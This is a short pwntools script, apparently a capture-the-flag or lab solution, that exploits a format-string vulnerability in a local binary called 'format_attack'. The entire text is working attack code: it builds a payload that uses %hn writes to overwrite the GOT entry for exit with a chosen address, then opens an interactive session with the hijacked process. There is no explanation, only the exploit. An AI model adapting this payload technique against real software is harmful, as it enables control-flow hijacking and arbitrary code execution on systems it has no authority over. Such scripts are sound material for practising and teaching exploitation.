from pwn import*
o = process("./format_attack")
elf = ELF("./format_attack")
exit_got = elf.got["exit"]
payload = p32(exit_got+2) + p32(exit_got)
payload += ("%{}d%7$hn".format(0x804-8)).encode()
payload += ("%{}d%8$hn".format(0x851b-0x804)).encode()
o.sendline(payload)
o.interactive()
